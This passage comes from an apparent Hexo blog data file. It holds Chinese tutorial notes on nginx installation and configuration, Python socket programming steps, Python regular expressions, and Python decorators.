title=\"配置文件：全局块，events块，http块\"></a>配置文件：全局块，events块，http块</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">\nworker_processes  1; # 线程数\n\n\nevents &#123;\n    worker_connections  1024; #最大连接数\n&#125;\n\n\nhttp &#123;\n    include       mime.types;\n    default_type  application&#x2F;octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n\n    upstream xxx &#123;\n        # ip_hash # 每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。\n\n        server 10.0.6.108:7080 weight&#x3D;2; # 权重越大被访问的次数就越多，默认是1，轮询 \n        server 10.0.0.85:8980 weight&#x3D;4; \n\n        # fair # 按后端服务器的响应时间来分配请求，响应时间短的优先分配。与weight分配策略类似。\n        # 这三种决策使用其中之一就可以  \n        # 这个用于实现负载均衡\n        # 在location使用：proxy_pass http:&#x2F;&#x2F;xxx就可以\n    &#125;\n\n\n\n    server &#123;\n    listen       80;\n    server_name  localhost;\n\n    # location的一些修饰符：\n    # &#x3D; 用于精确匹配\n    # ~ 用于区分大小写的正则匹配，模糊匹配\n    # ~* 用于不区分大小写的正则匹配，模糊匹配\n    # ^~ 用于字符串前缀匹配，找到最长匹配（高位匹配最多的，做完美的），然后停止查找\n\n    # ^~的优先级大于正则\n\n\n    location ~ &#x2F;group[0-9]&#x2F; &#123;\n            ngx_fastdfs_module;\n        &#125;\n\n    error_page   500 502 503 504  &#x2F;50x.html;\n    location &#x3D; &#x2F;50x.html &#123;\n            root   html;\n        &#125;\n    &#125;\n\n\n    # server在http中可以有多个\n    # location在server中也可以有多个，用于解决动静分离的时候可以用\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"反向代理\"><a href=\"#反向代理\" class=\"headerlink\" title=\"反向代理\"></a>反向代理</h4><p>通过proxy_pass 地址</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h1><h2 id=\"各种方式安装的nginx的启动方式\"><a href=\"#各种方式安装的nginx的启动方式\" class=\"headerlink\" title=\"各种方式安装的nginx的启动方式\"></a>各种方式安装的nginx的启动方式</h2><h3 id=\"通过命令行安装\"><a href=\"#通过命令行安装\" class=\"headerlink\" title=\"通过命令行安装\"></a>通过命令行安装</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">apt</span> <span class=\"token function\">install</span> nginx\n/etc/init.d/nginx start     <span class=\"token comment\"># 启动</span>\n/etc/init.d/nginx stop      <span class=\"token comment\"># 停止</span>\n/etc/init.d/nginx restart   <span class=\"token comment\"># 重启</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"通过docker安装\"><a href=\"#通过docker安装\" class=\"headerlink\" title=\"通过docker安装\"></a>通过docker安装</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">docker start nginx   # 启动\ndocker stop nginx\t # 停止\ndocker restart nginx # 重启<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"通过编译安装\"><a href=\"#通过编译安装\" class=\"headerlink\" title=\"通过编译安装\"></a>通过编译安装</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;xx&#x2F;xx&#x2F;nginx&#x2F;sbin&#x2F;nginx # 启动\n&#x2F;xx&#x2F;xx&#x2F;nginx&#x2F;sbin&#x2F;nginx -s reload # 重启\nps -ef | grep nginx &amp;&amp; kill xxxx # 关闭\nkill -9 nginx # 强制关闭<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"nginx概念\"><a href=\"#nginx概念\" class=\"headerlink\" title=\"nginx概念\"></a>nginx概念</h2><p>Nginx 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务</p>\n<h3 id=\"Nginx特色\"><a href=\"#Nginx特色\" class=\"headerlink\" title=\"Nginx特色\"></a>Nginx特色</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">1.反向代理:\n正向代理：客户端配置代理服务器，通过代理服务器进行互联网访问\n反向代理：客户端将请求发送给反向代理服务器，由反向代理服务器去选择目标服务器获取数据后，再返回给客户端，此时反向代理服务器和目标服务器对外来说就是一个服务器，暴露得是反向代理服务器的地址，隐藏了真正的服务器地址\n2、负载均衡（并发性能提升）：\n在客户端发送多次请求的时候，将请求分发到不同的服务器上\n3、动静分离：\n为了提升网站的解析速度，可以将静态页面和动态页面由不同的服务器来解析，加快解析速度，降低原本单个服务器的压力<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"nginx的安装\"><a href=\"#nginx的安装\" class=\"headerlink\" title=\"nginx的安装\"></a>nginx的安装</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">nginx:安装的本体（nginx.org）\n依赖：\nopenssl:支持nginx开通https的模块，非对称加密的工具（选择性下载）(https:&#x2F;&#x2F;www.openssl.org&#x2F;）\nzlib:是一款支持zlib压缩的模块(zlib.net)(必须下载)\npcre:是一个支持正则表达式的模块（www.pcre.org）（必须下载）\n\n都下载好以后就在usr&#x2F;share&#x2F;下面创建一个nginx文件夹\n将下载好的文件解压到nginx文件夹下\n\n安装C语言编译工具：\napt install gcc\napt install build-essential\napt install make\n\n进入解压好的nginx里面：\n.&#x2F;configure --with-http_ssl_module --with-openssl&#x3D;..&#x2F;opensslx-x-x  --with-pcre&#x3D;..&#x2F;pcrex-x-x --with-zlib&#x3D;..&#x2F;zlibx-x-x\n\n这个命令可以将模块加载进入nginx\n\n然后用make命令编译一下\nmake install安装一下\n\n安装在&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;下面\n\n进入这个目录\n启动：\n    进入sbin执行.&#x2F;nginx\n重启：\n    .&#x2F;nginx -s reload\n关闭：\n    pkill -9 nginx强制关闭\n    .&#x2F;nginx -s stop\n配置：\n    进入conf，vim编辑nginx.conf配置nginx\n    <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"基本使用\"><a href=\"#基本使用\" class=\"headerlink\" title=\"基本使用\"></a>基本使用</h2><h3 id=\"配置文件：全局块，events块，http块\"><a href=\"#配置文件：全局块，events块，http块\" class=\"headerlink\" title=\"配置文件：全局块，events块，http块\"></a>配置文件：全局块，events块，http块</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">\nworker_processes  1; # 线程数\n\n\nevents &#123;\n    worker_connections  1024; #最大连接数\n&#125;\n\n\nhttp &#123;\n    include       mime.types;\n    default_type  application&#x2F;octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n\n    upstream xxx &#123;\n        # ip_hash # 每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。\n\n        server 10.0.6.108:7080 weight&#x3D;2; # 权重越大被访问的次数就越多，默认是1，轮询 \n        server 10.0.0.85:8980 weight&#x3D;4; \n\n        # fair # 按后端服务器的响应时间来分配请求，响应时间短的优先分配。与weight分配策略类似。\n        # 这三种决策使用其中之一就可以  \n        # 这个用于实现负载均衡\n        # 在location使用：proxy_pass http:&#x2F;&#x2F;xxx就可以\n    &#125;\n\n\n\n    server &#123;\n    listen       80;\n    server_name  localhost;\n\n    # location的一些修饰符：\n    # &#x3D; 用于精确匹配\n    # ~ 用于区分大小写的正则匹配，模糊匹配\n    # ~* 用于不区分大小写的正则匹配，模糊匹配\n    # ^~ 用于字符串前缀匹配，找到最长匹配（高位匹配最多的，做完美的），然后停止查找\n\n    # ^~的优先级大于正则\n\n\n    location ~ &#x2F;group[0-9]&#x2F; &#123;\n            ngx_fastdfs_module;\n        &#125;\n\n    error_page   500 502 503 504  &#x2F;50x.html;\n    location &#x3D; &#x2F;50x.html &#123;\n            root   html;\n        &#125;\n    &#125;\n\n\n    # server在http中可以有多个\n    # location在server中也可以有多个，用于解决动静分离的时候可以用\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"反向代理\"><a href=\"#反向代理\" class=\"headerlink\" title=\"反向代理\"></a>反向代理</h4><p>通过proxy_pass 地址</p>\n"},{"title":"pythonWebSocket笔记","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-19T07:04:40.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"webSocket","_content":"## udp的数据通信\n```\n1、socket:创建套接字\n2、bind:绑定本地端口，接收数据必须绑定，发送数据可以不绑定\n3、sendto、recvfrom:接收发送数据\n4、close:关闭套接字\n```\n## tcp的数据通信\n>    客户端\n```\n1、socket:创建套接字\n*、bind:绑定端口号，客户端可以不用绑定，使用随机端口即可\n2、connect:链接服务器\n3、send、recv:接收发送数据\n4、close:关闭套接字\n```\n\n>   服务器\n```text\n1、socket:创建套接字\n*、setsock：套接字.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)，在客户端关闭之前，服务器首先关闭，关闭（close)\n2、bind:一定要绑定端口信息\n3、listen:使得主动变成被动\n4、accept:等待客户端链接\n5、send、recv:收发数据\n6、close:关闭套接字\n```","source":"_posts/pythonWebSocket笔记.md","raw":"---\ntitle: pythonWebSocket笔记\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-19 15:04:40\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: webSocket\ntags: basic\ncategories: Python\n---\n## udp的数据通信\n```\n1、socket:创建套接字\n2、bind:绑定本地端口，接收数据必须绑定，发送数据可以不绑定\n3、sendto、recvfrom:接收发送数据\n4、close:关闭套接字\n```\n## tcp的数据通信\n>    客户端\n```\n1、socket:创建套接字\n*、bind:绑定端口号，客户端可以不用绑定，使用随机端口即可\n2、connect:链接服务器\n3、send、recv:接收发送数据\n4、close:关闭套接字\n```\n\n>   服务器\n```text\n1、socket:创建套接字\n*、setsock：套接字.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)，在客户端关闭之前，服务器首先关闭，关闭（close)\n2、bind:一定要绑定端口信息\n3、listen:使得主动变成被动\n4、accept:等待客户端链接\n5、send、recv:收发数据\n6、close:关闭套接字\n```","slug":"pythonWebSocket笔记","published":1,"updated":"2023-03-10T02:53:22.981Z","_id":"cld2uqf6h000f1svkh5atfjws","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"udp的数据通信\"><a href=\"#udp的数据通信\" class=\"headerlink\" title=\"udp的数据通信\"></a>udp的数据通信</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、socket:创建套接字\n2、bind:绑定本地端口，接收数据必须绑定，发送数据可以不绑定\n3、sendto、recvfrom:接收发送数据\n4、close:关闭套接字<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"tcp的数据通信\"><a href=\"#tcp的数据通信\" class=\"headerlink\" title=\"tcp的数据通信\"></a>tcp的数据通信</h2><blockquote>\n<p>   客户端</p>\n</blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1、socket:创建套接字\n*、bind:绑定端口号，客户端可以不用绑定，使用随机端口即可\n2、connect:链接服务器\n3、send、recv:接收发送数据\n4、close:关闭套接字<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>  服务器</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">1、socket:创建套接字\n*、setsock：套接字.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)，在客户端关闭之前，服务器首先关闭，关闭（close)\n2、bind:一定要绑定端口信息\n3、listen:使得主动变成被动\n4、accept:等待客户端链接\n5、send、recv:收发数据\n6、close:关闭套接字<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"udp的数据通信\"><a href=\"#udp的数据通信\" class=\"headerlink\" title=\"udp的数据通信\"></a>udp的数据通信</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、socket:创建套接字\n2、bind:绑定本地端口，接收数据必须绑定，发送数据可以不绑定\n3、sendto、recvfrom:接收发送数据\n4、close:关闭套接字<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"tcp的数据通信\"><a href=\"#tcp的数据通信\" class=\"headerlink\" title=\"tcp的数据通信\"></a>tcp的数据通信</h2><blockquote>\n<p>   客户端</p>\n</blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1、socket:创建套接字\n*、bind:绑定端口号，客户端可以不用绑定，使用随机端口即可\n2、connect:链接服务器\n3、send、recv:接收发送数据\n4、close:关闭套接字<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>  服务器</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">1、socket:创建套接字\n*、setsock：套接字.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)，在客户端关闭之前，服务器首先关闭，关闭（close)\n2、bind:一定要绑定端口信息\n3、listen:使得主动变成被动\n4、accept:等待客户端链接\n5、send、recv:收发数据\n6、close:关闭套接字<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"python正则","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-19T06:56:11.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"python正则模块","_content":"\n## 正则\n\n>    1、匹配单个字符\n\n - . :点号表示匹配任意的一个字符（除了\\n),类似于ACCESS当中的？\n \n - []:方括号表示匹配[]当中的任何一个字符，[1-9],[1-35-8],[asbdef],[a-be-zA-Z0-4]都是可以的[AaBb]都是可以的\n \n - \\d:表示匹配任意一个数字（0-9）\n \n - \\D:表示匹配数字以外的任意一个其他字符\n \n - \\s:表示匹配任意一个空白，tab或者空格或者换页符等等\n \n - \\S:表示匹配一个非空白字符，除了空白以外的其他任意字符\n \n - \\w:表示匹配任意一个字母、数字、下划线，还有一种用法：\\w可以用来表示除了特殊字符以外的所有字符，包括汉字\n \n - \\W:表示匹配任意一个特殊字符\n \n - 使用方法:re.match(r'规则','要处理的字符串').group(),  match用来创建，group用来查看返回值\n\n\n> 匹配多个字符\n\n  - {}:大括号表示它前面紧挨着的那个字符出现的次数，{3,6},表示出现3到6次都可以，可以出现4，也可以出现3，只要在3到6的范围内都可以,{8}表示强制它前面紧挨着的字符必须出现8次\n  \n  - ？:表示？前面紧挨着的一个字符要么出现一次要么不出现\n  \n  - +:表示前面紧挨着的哪一个字符出现至少一次到无限次。和.连用‘.+’表示取出所有，前提是必须有至少一个字符\n  \n  - *:表示前面紧挨着的哪一个字符出现0次到无限次。和.连用‘.*’表示取出所有\n  \n  -  [^字符]:表示除了这个字符以外的\n  \n  -   [^字符]*:表示除了多个或者没有这个字符以外的\n  \n  -   ^：表示必须，如果在[]里面意思就相反，表示除了\n\n> 分组\n\n - |:与分组结合使用表示匹配分组中的任意一个字符串，(qq|web)，表示匹配qq或者web中的任意一个\n - ():分组，把正则表达式分成多组，从左往右组号升序\n -  \\num:与分组结合使用，多次出现相同的规则的时候可以用\\num来调用前面封装好的规则，如 \\1 表示调用前面的第一个分组的规则\n\n - 分组的取名和调用：\n  - 1、可以不取名，直接用组号 用第一个分组：\\1   ，  用第二个分组：\\2 以此类推\n   \n   - 2、当分组十分的多的时候，可以取名：原来的分组：(\\w*)  取名后的分组:(?P<name1>\\w*)    ?P<name1>就是取名的表达式\n  \n   -  3、使用取名后的分组：原来使用(\\1)   用名字使用:(?P=name1)\n\n> re模块的高级用法\n\n - 1.search: re.search(r'规则','字符串') 表示从这些字符串中找到符合规则的第一个数据\n \t\n - 2、findall: re.findall(r'规则','字符串') 表示从这些字符中找到所有的符合规则的数据，返回一个列表\n \n -  3、sub: re.sub(r'规则','替换字符串','字符串') 表示从这些字符中找到所有的符合规则的数据，然后全部替换成用来替换的字符串\n - 4、spilt: re.spilt(r'规则','字符串') 表示从这些字符串中找到符合规则的数据，并且从那里开始分割字符串，返回一个列表\n","source":"_posts/python正则.md","raw":"---\ntitle: python正则\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-19 14:56:11\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: python正则模块\ntags: basic\ncategories: Python\n---\n\n## 正则\n\n>    1、匹配单个字符\n\n - . :点号表示匹配任意的一个字符（除了\\n),类似于ACCESS当中的？\n \n - []:方括号表示匹配[]当中的任何一个字符，[1-9],[1-35-8],[asbdef],[a-be-zA-Z0-4]都是可以的[AaBb]都是可以的\n \n - \\d:表示匹配任意一个数字（0-9）\n \n - \\D:表示匹配数字以外的任意一个其他字符\n \n - \\s:表示匹配任意一个空白，tab或者空格或者换页符等等\n \n - \\S:表示匹配一个非空白字符，除了空白以外的其他任意字符\n \n - \\w:表示匹配任意一个字母、数字、下划线，还有一种用法：\\w可以用来表示除了特殊字符以外的所有字符，包括汉字\n \n - \\W:表示匹配任意一个特殊字符\n \n - 使用方法:re.match(r'规则','要处理的字符串').group(),  match用来创建，group用来查看返回值\n\n\n> 匹配多个字符\n\n  - {}:大括号表示它前面紧挨着的那个字符出现的次数，{3,6},表示出现3到6次都可以，可以出现4，也可以出现3，只要在3到6的范围内都可以,{8}表示强制它前面紧挨着的字符必须出现8次\n  \n  - ？:表示？前面紧挨着的一个字符要么出现一次要么不出现\n  \n  - +:表示前面紧挨着的哪一个字符出现至少一次到无限次。和.连用‘.+’表示取出所有，前提是必须有至少一个字符\n  \n  - *:表示前面紧挨着的哪一个字符出现0次到无限次。和.连用‘.*’表示取出所有\n  \n  -  [^字符]:表示除了这个字符以外的\n  \n  -   [^字符]*:表示除了多个或者没有这个字符以外的\n  \n  -   ^：表示必须，如果在[]里面意思就相反，表示除了\n\n> 分组\n\n - |:与分组结合使用表示匹配分组中的任意一个字符串，(qq|web)，表示匹配qq或者web中的任意一个\n - ():分组，把正则表达式分成多组，从左往右组号升序\n -  \\num:与分组结合使用，多次出现相同的规则的时候可以用\\num来调用前面封装好的规则，如 \\1 表示调用前面的第一个分组的规则\n\n - 分组的取名和调用：\n  - 1、可以不取名，直接用组号 用第一个分组：\\1   ，  用第二个分组：\\2 以此类推\n   \n   - 2、当分组十分的多的时候，可以取名：原来的分组：(\\w*)  取名后的分组:(?P<name1>\\w*)    ?P<name1>就是取名的表达式\n  \n   -  3、使用取名后的分组：原来使用(\\1)   用名字使用:(?P=name1)\n\n> re模块的高级用法\n\n - 1.search: re.search(r'规则','字符串') 表示从这些字符串中找到符合规则的第一个数据\n \t\n - 2、findall: re.findall(r'规则','字符串') 表示从这些字符中找到所有的符合规则的数据，返回一个列表\n \n -  3、sub: re.sub(r'规则','替换字符串','字符串') 表示从这些字符中找到所有的符合规则的数据，然后全部替换成用来替换的字符串\n - 4、spilt: re.spilt(r'规则','字符串') 表示从这些字符串中找到符合规则的数据，并且从那里开始分割字符串，返回一个列表\n","slug":"python正则","published":1,"updated":"2023-03-10T02:53:06.495Z","_id":"cld2uqf6i000h1svk7fxp9vu0","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"正则\"><a href=\"#正则\" class=\"headerlink\" title=\"正则\"></a>正则</h2><blockquote>\n<p>   1、匹配单个字符</p>\n</blockquote>\n<ul>\n<li>. :点号表示匹配任意的一个字符（除了\\n),类似于ACCESS当中的？</li>\n<li>[]:方括号表示匹配[]当中的任何一个字符，[1-9],[1-35-8],[asbdef],[a-be-zA-Z0-4]都是可以的[AaBb]都是可以的</li>\n<li>\\d:表示匹配任意一个数字（0-9）</li>\n<li>\\D:表示匹配数字以外的任意一个其他字符</li>\n<li>\\s:表示匹配任意一个空白，tab或者空格或者换页符等等</li>\n<li>\\S:表示匹配一个非空白字符，除了空白以外的其他任意字符</li>\n<li>\\w:表示匹配任意一个字母、数字、下划线，还有一种用法：\\w可以用来表示除了特殊字符以外的所有字符，包括汉字</li>\n<li>\\W:表示匹配任意一个特殊字符</li>\n<li>使用方法:re.match(r’规则’,’要处理的字符串’).group(),  match用来创建，group用来查看返回值</li>\n</ul>\n<blockquote>\n<p>匹配多个字符</p>\n</blockquote>\n<ul>\n<li>{}:大括号表示它前面紧挨着的那个字符出现的次数，{3,6},表示出现3到6次都可以，可以出现4，也可以出现3，只要在3到6的范围内都可以,{8}表示强制它前面紧挨着的字符必须出现8次</li>\n<li>？:表示？前面紧挨着的一个字符要么出现一次要么不出现</li>\n<li>+:表示前面紧挨着的哪一个字符出现至少一次到无限次。和.连用‘.+’表示取出所有，前提是必须有至少一个字符</li>\n<li>*:表示前面紧挨着的哪一个字符出现0次到无限次。和.连用‘.*’表示取出所有</li>\n<li>[^字符]:表示除了这个字符以外的</li>\n<li>[^字符]*:表示除了多个或者没有这个字符以外的</li>\n<li>  ^：表示必须，如果在[]里面意思就相反，表示除了</li>\n</ul>\n<blockquote>\n<p>分组</p>\n</blockquote>\n<ul>\n<li><p>|:与分组结合使用表示匹配分组中的任意一个字符串，(qq|web)，表示匹配qq或者web中的任意一个</p>\n</li>\n<li><p>():分组，把正则表达式分成多组，从左往右组号升序</p>\n</li>\n<li><p> \\num:与分组结合使用，多次出现相同的规则的时候可以用\\num来调用前面封装好的规则，如 \\1 表示调用前面的第一个分组的规则</p>\n</li>\n<li><p>分组的取名和调用：</p>\n</li>\n<li><p>1、可以不取名，直接用组号 用第一个分组：\\1   ，  用第二个分组：\\2 以此类推</p>\n</li>\n<li><p>2、当分组十分的多的时候，可以取名：原来的分组：(\\w*)  取名后的分组:(?P<name1>\\w*)    ?P<name1>就是取名的表达式</p>\n</li>\n<li><p> 3、使用取名后的分组：原来使用(\\1)   用名字使用:(?P=name1)</p>\n</li>\n</ul>\n<blockquote>\n<p>re模块的高级用法</p>\n</blockquote>\n<ul>\n<li>1.search: re.search(r’规则’,’字符串’) 表示从这些字符串中找到符合规则的第一个数据</li>\n<li>2、findall: re.findall(r’规则’,’字符串’) 表示从这些字符中找到所有的符合规则的数据，返回一个列表</li>\n<li> 3、sub: re.sub(r’规则’,’替换字符串’,’字符串’) 表示从这些字符中找到所有的符合规则的数据，然后全部替换成用来替换的字符串</li>\n<li>4、spilt: re.spilt(r’规则’,’字符串’) 表示从这些字符串中找到符合规则的数据，并且从那里开始分割字符串，返回一个列表</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"正则\"><a href=\"#正则\" class=\"headerlink\" title=\"正则\"></a>正则</h2><blockquote>\n<p>   1、匹配单个字符</p>\n</blockquote>\n<ul>\n<li>. :点号表示匹配任意的一个字符（除了\\n),类似于ACCESS当中的？</li>\n<li>[]:方括号表示匹配[]当中的任何一个字符，[1-9],[1-35-8],[asbdef],[a-be-zA-Z0-4]都是可以的[AaBb]都是可以的</li>\n<li>\\d:表示匹配任意一个数字（0-9）</li>\n<li>\\D:表示匹配数字以外的任意一个其他字符</li>\n<li>\\s:表示匹配任意一个空白，tab或者空格或者换页符等等</li>\n<li>\\S:表示匹配一个非空白字符，除了空白以外的其他任意字符</li>\n<li>\\w:表示匹配任意一个字母、数字、下划线，还有一种用法：\\w可以用来表示除了特殊字符以外的所有字符，包括汉字</li>\n<li>\\W:表示匹配任意一个特殊字符</li>\n<li>使用方法:re.match(r’规则’,’要处理的字符串’).group(),  match用来创建，group用来查看返回值</li>\n</ul>\n<blockquote>\n<p>匹配多个字符</p>\n</blockquote>\n<ul>\n<li>{}:大括号表示它前面紧挨着的那个字符出现的次数，{3,6},表示出现3到6次都可以，可以出现4，也可以出现3，只要在3到6的范围内都可以,{8}表示强制它前面紧挨着的字符必须出现8次</li>\n<li>？:表示？前面紧挨着的一个字符要么出现一次要么不出现</li>\n<li>+:表示前面紧挨着的哪一个字符出现至少一次到无限次。和.连用‘.+’表示取出所有，前提是必须有至少一个字符</li>\n<li>*:表示前面紧挨着的哪一个字符出现0次到无限次。和.连用‘.*’表示取出所有</li>\n<li>[^字符]:表示除了这个字符以外的</li>\n<li>[^字符]*:表示除了多个或者没有这个字符以外的</li>\n<li>  ^：表示必须，如果在[]里面意思就相反，表示除了</li>\n</ul>\n<blockquote>\n<p>分组</p>\n</blockquote>\n<ul>\n<li><p>|:与分组结合使用表示匹配分组中的任意一个字符串，(qq|web)，表示匹配qq或者web中的任意一个</p>\n</li>\n<li><p>():分组，把正则表达式分成多组，从左往右组号升序</p>\n</li>\n<li><p> \\num:与分组结合使用，多次出现相同的规则的时候可以用\\num来调用前面封装好的规则，如 \\1 表示调用前面的第一个分组的规则</p>\n</li>\n<li><p>分组的取名和调用：</p>\n</li>\n<li><p>1、可以不取名，直接用组号 用第一个分组：\\1   ，  用第二个分组：\\2 以此类推</p>\n</li>\n<li><p>2、当分组十分的多的时候，可以取名：原来的分组：(\\w*)  取名后的分组:(?P<name1>\\w*)    ?P<name1>就是取名的表达式</p>\n</li>\n<li><p> 3、使用取名后的分组：原来使用(\\1)   用名字使用:(?P=name1)</p>\n</li>\n</ul>\n<blockquote>\n<p>re模块的高级用法</p>\n</blockquote>\n<ul>\n<li>1.search: re.search(r’规则’,’字符串’) 表示从这些字符串中找到符合规则的第一个数据</li>\n<li>2、findall: re.findall(r’规则’,’字符串’) 表示从这些字符中找到所有的符合规则的数据，返回一个列表</li>\n<li> 3、sub: re.sub(r’规则’,’替换字符串’,’字符串’) 表示从这些字符中找到所有的符合规则的数据，然后全部替换成用来替换的字符串</li>\n<li>4、spilt: re.spilt(r’规则’,’字符串’) 表示从这些字符串中找到符合规则的数据，并且从那里开始分割字符串，返回一个列表</li>\n</ul>\n"},{"title":"python装饰器","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-19T06:44:21.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"装饰器","_content":"## 装饰器\n > 原理:将一个函数的引用传递到另一个闭包里面去\n\n```python\ndef func_set(func(函数)):\n    def func_start(参数):\n        print(\"验证一\")\n        print(\"验证二\")\n        func()\n    return func_start\n```\n\n> 使用方法一\n\n```python\n@func_set\ndef test(参数):\n    print(\"test\")\n```\n\n > 使用方法二\n \n ```python\nret = func_set(test)\nret()\n```\n\n> 说明:装饰器的闭包中，外部函数用来接收函数，内部函数用来接收函数的参数，并且在没有调用函数之前只要有@就开始装饰,在装饰不定长的函数时\n\n```python\ndef test(x,*args,**kwargs):\n    print(\"test\")\n```\n \n- 这种函数的装饰器的内部函数参数定义为(*args, **kwargs)就可以了，这种装饰器叫做通用装饰器,遇到有返回值的函数的时候，装饰器的内部函数也要有return，格式:return 函数（参数）\n\n\n\n### 装饰器带参数\n> 带参数的装饰器:@装饰器名称(参数)\n\n```python\ndef 第一层(参数):                        # 第一层用来保存装饰器的参数\n    def 第二层(函数):                    # 第二层用来保存被装的函数\n        def 第三层(函数的参数):           # 第三层用来保存被装函数的参数，并且进行装饰函数，并且使用第一层保存的装饰器参数\n            语句块\n            [return] 函数\n        return 第三层\n    return 第二层\n  ```\n\n> 多个装饰器对同一个函数装饰:装饰的时候最下面的开始装,从下往上装\n\n\n### 类装饰器\n> 基本构架\n\n```python\nclass Tt():\n    def __init__(self, func):\n        self.func = func\n\n    def __call__(self,[*args,**kwargs]):\n        代码\n        [return] self.func\n\n@Tt     #还可以点出更多东西以后会学到\ndef test():\n    return \"haha\"\n\ntest()\n```","source":"_posts/python装饰器.md","raw":"---\ntitle: python装饰器\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-19 14:44:21\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: 装饰器\ntags: basic\ncategories: Python\n---\n## 装饰器\n > 原理:将一个函数的引用传递到另一个闭包里面去\n\n```python\ndef func_set(func(函数)):\n    def func_start(参数):\n        print(\"验证一\")\n        print(\"验证二\")\n        func()\n    return func_start\n```\n\n> 使用方法一\n\n```python\n@func_set\ndef test(参数):\n    print(\"test\")\n```\n\n > 使用方法二\n \n ```python\nret = func_set(test)\nret()\n```\n\n> 